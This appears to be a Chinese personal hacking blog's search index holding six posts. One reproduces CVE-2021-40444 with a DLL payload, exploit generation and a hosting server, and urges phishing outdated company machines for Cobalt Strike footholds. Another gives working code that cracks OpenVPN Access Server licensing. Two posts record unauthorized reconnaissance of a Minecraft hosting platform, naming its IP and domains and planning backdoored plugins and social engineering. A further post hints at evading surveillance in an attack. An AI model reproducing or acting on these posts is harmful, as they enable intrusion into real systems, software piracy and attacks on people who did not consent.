<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记一次Docker试水</title>
      <link href="/posts/12341lkaf/"/>
      <url>/posts/12341lkaf/</url>
      
        <content type="html"><![CDATA[<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>容器是非常强大的一项发明，他解决了过去许多环境配置非常冗杂的问题。</p><p>很久之前就已经听说docker了，但是一直没去用过，今天想把这个坑给填上，于是乎就开始实验了。</p><p>首先直接是装一个docker-desktop，由于不想开虚拟机再配置虚拟环境，这样对电脑的性能会有影响，所以是在windows上面配置。打开docker之后上来的问题就是说报错wsl 2未配置。</p><p><img src="/posts/12341lkaf/2.png"></p><p>这下就有来头了，这wsl2装好之后，发现这是个非常强大功能，直接在windows上运行了linux环境。</p><p><img src="/posts/12341lkaf/1.png"></p><p>但由于默认是在C盘下，C盘有限的空间不能装太多东西，于是就将其导出，然后换个盘重新导入</p><pre><code class="sh">wsl --list -v    #查看当前环境的列表wsl --export xxx x:/xxx.tar    #导出wsl --unregister xxx    #将原来的卸载wsl --import xxx x:/xxx x:/xxx.tar --version 2 #导入xxx config --default-user xxx #重新配置一下原来的默认账户，否则默认是root</code></pre><p>然后启动docker发现还是报错，这时候应该是我们wsl版本低了，去安装个升级版本就行了。</p><hr><p>搞好后就可以开始搞docker了</p><p>以一个古老的kms镜像举例</p><p>拿到一个dockerfile</p><pre><code class="sh">docker build -t kms:v1 .    #先build一个镜像dokcer run -i -p 1688:1688 kms:v1    #启动kms:v1的container，容器端口映射到了本机的1688</code></pre><p><img src="/posts/12341lkaf/3.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这样一来container就起来了，docker-desktop还带有图像化界面可以操作，像vulhub这种有compose的，配置文件是yml，可以利用docker-compose up/down 来执行。</p><p>这次经验直接解决了windows下渗透机的问题，比如searchsploit或者其他工具，这样一来，渗透效率会提高许多，试想一下，把vulhub，宝塔，phpstudy，docker各种环境揉起来，甚至可以直接一套机子整套环境，再加上个rolan，不知道效率会不会起飞呢。不过最好还是分几个虚拟机比较好，safety first。</p><hr><blockquote><ul><li><p>最近在学习些操作系统机制，从舟长那里学到了不少，那些病毒也很有魅力，打算以后往红队发展了，算是转正吧。发现踏实研究的要比现在网上那些华而不实的人好太多，奇技淫巧拿来吹牛b或者自娱自乐还不错，但终究还是虚的，今后像TOM这样的可能只会越来越多，趋势如此。</p></li><li><p>今天看企鹅发了篇信息收集的专栏，觉得挺不错，打算再做一此信息收集的概要，并不会完全覆盖到，毕竟这一面太广，先把企鹅的那些给做掉。</p></li></ul></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-40444</title>
      <link href="/posts/lsqwreoxckl/"/>
      <url>/posts/lsqwreoxckl/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://paper.seebug.org/1718/">https://paper.seebug.org/1718/</a></li></ul><h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><p>前一阵子的微软0day大洞，CVE-2021-40444，之前因为些杂七杂八的事情，错过了好时机，现在来补上。头一次研究这个方向的漏洞，过去都是渗透方面的漏洞，这个应该是属于红队方面的了，而且偏软件类，由于这方面知识储备不足，深层的漏洞原理也只是模糊了解，但不管怎么说，这个漏洞就当作初入这个领域的热身了。</p><p>Microsoft MSHTML的远程代码执行导致可以利用ActiveX进行控制</p><p>以word为例，在word内插入一个由文件创建的对象，选择链接到文件，文件名选择准备好的恶意文件的外部地址，就像挂马一样</p><p>漏洞利用mhtml协议打开远程站点的html文件，而其中包含的JS代码创建ActiveX来下载提前构筑好的cab文件，提取其中的inf文件（DLL）并以CPL执行，最终执行其中的payload。</p><p>软件调试方面的资料有上面的参考。</p><h2 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h2><p>选择用github上的poc</p><ul><li><a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></li></ul><pre><code class="shell">sudo apt-get install lcabsudo apt-get install mingw-w64</code></pre><p>安装好lcab和编译环境</p><p>制作我们自己想要的dll文件，创建.c文件将想要的payload放进去，比如想要CS上线就把就用CS的payload，我们直接用官方自带的弹计算器的payload。</p><pre><code class="c">#include &lt;windows.h&gt;void exec(void) &#123;    system(&quot;C:\\Windows\\System32\\calc.exe&quot;);    return;&#125;BOOL WINAPI DllMain(    HINSTANCE hinstDLL,    DWORD fdwReason,     LPVOID lpReserved )&#123;    switch( fdwReason )     &#123;         case DLL_PROCESS_ATTACH:           exec();            break;        case DLL_THREAD_ATTACH:            break;        case DLL_THREAD_DETACH:            break;        case DLL_PROCESS_DETACH:            break;    &#125;    return TRUE;&#125;</code></pre><p><img src="/posts/lsqwreoxckl/1.png"></p><p>然后把他编译为dll文件，并放入test目录</p><pre><code class="shell">i686-w64-mingw32-gcc -shared x.c -o x.dll</code></pre><p><img src="/posts/lsqwreoxckl/2.png"></p><p>接下来就运行exploit文件来生成携有恶意JS的html以及cab文件</p><pre><code class="shell">python3 exploit.py generate test/x.dll http://xx.xx.xx.xx #存payload的dll与公网服务器地址</code></pre><p>进入/src开启web服务</p><pre><code class="shell">python3 -m http.server 80</code></pre><p><img src="/posts/lsqwreoxckl/3.png"></p><p>再把out目录下生成的或者我们自己添加对象了的恶意word文件在windows打开就可以顺利弹一个计算器出来。如果payload放的是cs的powershell那就直接上线了，对方只要打开word就直接被拿下。</p><p>目前微软已经更新了补丁，但是这招依然可以对不少目标实施攻击，尤其是一些公司内计算机系统，大部分都是老的而且不怎么更新的，进行钓鱼攻击的话直接上线CS再进行内网渗透，扩大战果。</p><hr><center>顺带节日祝福，中秋快乐 </center>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【杂技篇】微信抢红包</title>
      <link href="/posts/qreiozlskj/"/>
      <url>/posts/qreiozlskj/</url>
      
        <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>忙着调节生物钟，躺平了几天，整理了下思路，昨天突发奇想想开发些脚本玩一玩，像啥自动化游戏，抢红包一类的，可能说是不务正业，但是就当是玩一玩了，然后去调查了一番，选择了nodescript也就是节点精灵作为我的开发工具，他的开发语言是Lua语言，一门基于c的脚本语言，我记得以前有个高中同学喜欢玩武装突袭，就是用的这门语言做mod。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>看了俩小时lua的基础之后，直接开始整活，打算当晚给他办了。首先是尝试模拟器来开发，奈何微信对模拟器的识别非常imba导致我不得不用本机装上节点精灵开始开发。</p><p>进入开发页面</p><p><img src="/posts/qreiozlskj/333.png"></p><p>创建脚本起名为wechat，就打算直接做一个抢红包软件。</p><p>然后需要做的就是不断的采集节点，需要弹窗出来的消息节点，聊天界面的红包，还需要将已收的红包与未收的区别开来，并对打开红包和返回页面进行收集。</p><p><img src="/posts/qreiozlskj/444.png"></p><p>一路定义好之后将代码逻辑整理好</p><p><img src="/posts/qreiozlskj/555.png"></p><p>具体逻辑就是建立一个循环，当其中有true时就执行函数，将弹窗出来时就打开，当检查到我们处于聊天界面时就再检查有无未收的红包，有的话就点击红包，然后又会将上面的open变为True，接着就是back了，这样一来，就是一个完整的自动收红包流程。</p><p><img src="/posts/qreiozlskj/222.jpg"></p><p>与朋友验证过后成功，开发完成，目前似乎需要检测到红包的顶部弹窗提示，所以等待抢的时候应该是需要离开微信的，也不清楚每一部手机的兼容性如何，具体还需测试，支持安卓不支持IOS，IOS用户可以上云手机直接用。这个脚本可以打包成app上云控，也不打算把他上架，看情况吧。</p><h2 id="暗度陈仓部分"><a href="#暗度陈仓部分" class="headerlink" title="暗度陈仓部分"></a>暗度陈仓部分</h2><p>今天有朋友给我发了一张图，有点让我错愕，有些东西至今还有太多人不明白，而网络上也不存在关于某些方面的讨论与答案。鉴于法律的缘故，只能把某些事的原理剖析出来给大家参考。</p><p><img src="/posts/qreiozlskj/666.jpg"></p><p>做个比喻吧，有一个人他怀里揣满炸弹，想去炸火车站，别问哪个站，他需要过许多道关口，每个关口都有安检门和监控，但是无人值守，安检门也没人值守，那人便把浑身包满很厚的锡纸，过了安检，并没有触发警报，就这样一路过了许多关口，顺利到达了火车站，假设他最后成功炸了站，那试问你觉得警察能不能调查到他，答案显而易见。更何况每个监控的背后还有大数据分析的加持。</p><p>没出事之前，当然不会被查，但问题是出了事的话怎么办。不走关卡，而宽带就是一条充满关卡的路线，你可以选择绕道走，甚至多绕几条道。而找到一条道之后万一半路堵塞，你在尝试绕的时侯又是走的关卡，那样岂不就是白费功夫了。再解决这个问题之后，问题又来了即使你成功隐蔽了自己，你制作炸药的炸药原材料从何而来，你的购买记录、身份信息、过去的出行记录等等等，毕竟你不可能做到每时每刻都能隐蔽自己。对应到的可能是本机记录，可能是网卡地址、聊天记录、往期记录等等等。话题不再深入了，至于解题的思路，就靠悟了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂技 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OAS破解及V2代理拨号</title>
      <link href="/posts/zxvzqiqi/"/>
      <url>/posts/zxvzqiqi/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://www.starduster.me/2019/12/19/talk-about-egg-file-and-hacking-ovpnas/">https://www.starduster.me/2019/12/19/talk-about-egg-file-and-hacking-ovpnas/</a></li><li><a href="https://6xyun.cn/article/112">https://6xyun.cn/article/112</a></li><li><a href="https://www.wangfeng.live/2020/11/centos7-openvpn-access-server-installation-latest-version/">https://www.wangfeng.live/2020/11/centos7-openvpn-access-server-installation-latest-version/</a></li><li><a href="http://www.sycmd.com/post-368.html">http://www.sycmd.com/post-368.html</a></li></ul></blockquote><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>某位老朋友因为校园网的关系v2突然无效了，想帮他使用强力点的方法，本想用OAS开多账户，结果发现OAS在未有license情况下最多就2个账户，于是就开始想办法破解OAS，同时发现V2失效是因为拨号上网的原因，就一并解决了。</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>首先是去尝试破解最新版的OAS，获取pyovpn-2.0-py3.8.egg</p><p><img src="/posts/zxvzqiqi/1.png"></p><p>随后将其中的uprop.pyc更改为uprop2.pyc，再新建一个uprop.py，写入代码</p><pre><code class="python">from pyovpn.lic import uprop2old_figure = Nonedef new_figure(self, licdict):    ret = old_figure(self, licdict)    ret[&#39;concurrent_connections&#39;] = 1024    return retfor x in dir(uprop2):    if x[:2] == &#39;__&#39;:        continue    if x == &#39;UsageProperties&#39;:        exec(&#39;old_figure = uprop2.UsageProperties.figure&#39;)        exec(&#39;uprop2.UsageProperties.figure = new_figure&#39;)    exec(&#39;%s = uprop2.%s&#39; % (x, x))</code></pre><p>然后将其编译为库文件，并更名为uprop.pyc，python版本3.7</p><pre><code class="shell">python3 -O -m compileall uprop.py &amp;&amp; mv __pycache__/uprop.cpython-37.opt-1.pyc uprop.pyc</code></pre><p>原理似乎是将原来的pyc文件改名，然后用新的替代并重新劫持原来的pyc</p><p>最后将uprop.pyc与uprop2.pyc放入egg文件，最后传回服务器重启服务</p><p><img src="/posts/zxvzqiqi/2.png"></p><p>无奈失败，不知道是什么原因，试了很多次都不行，有朋友成功的可以联系我。</p><p>尝试第二种方法</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>这种方法对低版本有效，新版本不行</p><p>我用的是2.5.2的oas</p><p>安装</p><pre><code class="sh">yum -y install https://as-repository.openvpn.net/as-repo-centos7.rpmyum -y install openvpn-as</code></pre><p>可以直接线上下包装也可以手动下载包装</p><pre><code class="sh">rpm -ivh openvpn-as-2.5.2-CentOSrelease.x86_64.rpm</code></pre><p>装完改密码</p><pre><code class="sh">passwd openvpn</code></pre><p>然后破解，和上面的一样，不过是修改一下uprop.py的内容改成</p><pre><code class="python">import uprop2old_figure = Nonedef new_figure(self, licdict):    ret = old_figure(self, licdict)    ret[&#39;concurrent_connections&#39;] = 1024    return retfor x in dir(uprop2):    if x[:2] == &#39;__&#39;:        continue    if x == &#39;UsageProperties&#39;:        exec &#39;old_figure = uprop2.UsageProperties.figure&#39;        exec &#39;uprop2.UsageProperties.figure = new_figure&#39;    exec &#39;%s = uprop2.%s&#39; % (x, x)</code></pre><p>然后同样的流程，破解文件是在/usr/local/openvpn_as/lib/python2.7/site-packages/目录下，然后覆盖</p><p>再进入/usr/local/openvpn_as/bin目录，执行./_ovpn-init</p><pre><code class="sh">./_ovpn-init</code></pre><p>报错就注释掉，然后一路默认就行</p><p>重新登控制台</p><p><img src="/posts/zxvzqiqi/3.png"></p><p>现在支持1024个设备同时连接了，非常好。</p><blockquote><p>github上有脚本也可以直接破解</p><ul><li><a href="https://github.com/Nirob3x/OpenVPN-As-Unlimited">https://github.com/Nirob3x/OpenVPN-As-Unlimited</a></li></ul></blockquote><h2 id="解决V2突然失效问题"><a href="#解决V2突然失效问题" class="headerlink" title="解决V2突然失效问题"></a>解决V2突然失效问题</h2><p>发现是由于朋友的校园网是拨号上网导致的，v2不会自动代理拨号，于是参考了网上的解决方式</p><p>将拨号上网的名称改成英文，然后再把下面的自动代理设置上就解决了。</p><h2 id="主线"><a href="#主线" class="headerlink" title="主线"></a>主线</h2><blockquote><p>【今天看到九世发新文关于CVE-2021-40444的复现，还发现了ProcessMonitor这个玩意，无奈我对软件安全层面的知识匮乏，还有很多需要学习，本来今天计划是学习这个漏洞拓展知识面，后来被打乱了，不过后续可以补上】</p><p>【自己写python往Pocsuite里面添轮子】</p><p>【搭建vulhub，学习主流漏洞利用手法】</p><p>【批量采集目标，去实战，对市面上主流的各类框架、cms越来越熟悉，对可能存在的漏洞越来越敏锐，学习免杀还有bypass的技巧】</p><p>【对软件方面的安全越来越感兴趣了，想学习下C#】</p><p>【系统学习一下内网渗透，玩一下无线渗透】</p></blockquote><h2 id="支线"><a href="#支线" class="headerlink" title="支线"></a>支线</h2><blockquote><p>【一些乱七八糟的东西还有委托，比如：MINECRACK，之前对主站的前台挖了下，没发现逻辑漏洞，不知道后台有没有，如果不存在的话就难搞了，或许可以想办法做个外挂来曲线救国，不过我现在对外挂还有MC都不太在行，估计要拖一拖了】</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MINECRACK（第二章）</title>
      <link href="/posts/01odjfnkla/"/>
      <url>/posts/01odjfnkla/</url>
      
        <content type="html"><![CDATA[<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>之前拿到了对方的一个域名e5-a14-auto.7skyun.com，了解了下目标情况，是一个叫星域互联的专门做MC开服的平台。</p><p><img src="/posts/01odjfnkla/fwerq.png"></p><p><img src="/posts/01odjfnkla/asdfaf.png"></p><p>这样一来，可以确定对方不是一个私人服务器而是平台，那之前的一些进攻思路就要转变了。先进行一波信息收集</p><p><img src="/posts/01odjfnkla/shouji.png"></p><p>可以看到，现在已知目标有2台是在一个c段里，算是一个大型站群，也可能他的游戏服会堆在一个服务器里面。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>目前针对目标收集了一些基本信息，后续可以挖掘出更多，首选是到他的客户中心里面去挖一挖洞，如果运气好甚至可以一锅端，这个项目就暂时先做到信息收集这里，毕竟是无偿做公益就当是娱乐向了，还有好多要学的要干的，后续的坑等有空了再来补上。</p><h3><center>未完待续</center></h3>]]></content>
      
      
      
        <tags>
            
            <tag> 委托 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MINECRACK（第一章）</title>
      <link href="/posts/12danfl2w/"/>
      <url>/posts/12danfl2w/</url>
      
        <content type="html"><![CDATA[<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>针对一个MC正版服，有百人规模，受好友委托想要让其游戏角色获得op权限，不进行任何破坏性举动，腐竹亦是好友的好友。</p><p>我也懒得打码了，就把过程完完整整放出来吧啊(～￣▽￣)～</p><h2 id="MC开服方法"><a href="#MC开服方法" class="headerlink" title="MC开服方法"></a>MC开服方法</h2><ol><li>本地搭建然后内网穿透</li><li>购买vps搭建</li><li>第三方面板服</li><li>Realms</li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>如果对方存在面板，可以尝试进面板然后加附带后门的插件</li><li>如果存在其他服务如ssh，ftp或者有网站、开放数据库等，进行测试看看能不能进去</li><li>进行资产收集看看其他目标有没有突破口</li><li>C段测试其他目标弱点，看看是不是处于一个内网</li><li>社会工程学，想办法让服主说出面板密码（如果存在），或者让他装上带后门的插件</li></ol><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先做信息收集，已知其游戏服务器进入的域名为 yicraft.xyz，打算查他的ip，先ping了目标，然后ping不通，尝试nslookup，发现挂了VPN的查的到，不挂查不到，同时发现这是个NS解析的域名，推测是绑了cdn，但是这又很不符合特征，绑了cdn也应该查的到，就非常的奇怪</p><p><img src="/posts/12danfl2w/image-20210911233239293.png"></p><p><img src="/posts/12danfl2w/image-20210911233158538.png"></p><p>尝试直接进游戏然后tasklist看pid，再netstat查看对应的tcp连接，对比进服和没进服的连接，推测出了IP地址</p><ul><li>222.187.254.89:30890</li></ul><p><img src="/posts/12danfl2w/image-20210911234710682.png"></p><p>将游戏地址改成这个IP和端口，成功进入</p><p><img src="/posts/12danfl2w/image-20210912134221703.png"></p><p><img src="/posts/12danfl2w/image-20210912134329865.png"></p><p>然后我尝试找出为什么会导致查不到ip的原因，最终在油管上找到了一个反查ip的视频，他说了目标服务器用了SRV解析隐藏了真实域名，不过他直接ping出来ip地址（伪的）了，我尝试用相同的方法，成功获取到域名，还得到和刚才一样的ip以及新域名</p><ul><li>mc33.starmc.cn</li><li>e5-a14-auto.7skyun.com</li></ul><ul><li><a href="https://www.youtube.com/watch?v=DJnXztiyAmI">https://www.youtube.com/watch?v=DJnXztiyAmI</a></li></ul><p><img src="/posts/12danfl2w/image-20210911235620088.png"></p><p>把服务器地址改为出来的mc33.starmc.cn进入，结果被断了，应该是服务器没有对这个域名提供服务</p><p><img src="/posts/12danfl2w/image-20210911234134836.png"></p><p><img src="/posts/12danfl2w/image-20210911232532116.png"></p><p>至此，我们已经得到了目标服务器的IP地址，但是针对其的资产收集还有各种测试还有待完成，就暂且先做到这，等以后有空再继续进行渗透。</p><blockquote><p>[服务器IP] 222.187.254.89:30890</p><p>[真实域名] mc33.starmc.cn</p><p>[伪装域名] yicraft.xyz</p><p>[未知] e5-a14-auto.7skyun.com</p></blockquote><h3><center>未完待续</center></h3>]]></content>
      
      
      
        <tags>
            
            <tag> 委托 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
